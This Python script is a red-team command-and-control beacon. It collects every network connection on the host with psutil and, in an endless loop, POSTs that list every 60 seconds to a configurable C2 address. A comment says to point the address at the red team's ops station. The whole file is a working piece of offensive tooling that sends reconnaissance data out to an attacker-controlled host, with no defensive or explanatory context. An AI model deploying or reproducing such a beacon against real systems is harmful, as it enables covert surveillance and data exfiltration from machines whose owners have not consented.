import requests
import time
import psutil

# Configuration
C2_URL = 'x.x.x.x/network'#Change to the redteams ops_station you want to beacon back to.
INTERVAL = 60  # Beacon interval in seconds

def get_network_connections():
    connections = []
    for conn in psutil.net_connections(kind='inet'):
        conn_info = {
            'local_address': f"{conn.laddr.ip}:{conn.laddr.port}",
            'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
            'status': conn.status
        }
        connections.append(conn_info)
    return connections

def beacon():
    while True:
        connections = get_network_connections()
        payload = {
            'network_connections': connections
        }
        send_payload(payload)
        time.sleep(INTERVAL)

def send_payload(payload):
    try:
        response = requests.post(C2_URL, json=payload)
        if response.status_code == 200:
            print("Network connections sent successfully.")
        else:
            print(f"Failed to send network connections. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending network connections: {e}")

if __name__ == "__main__":
    beacon()
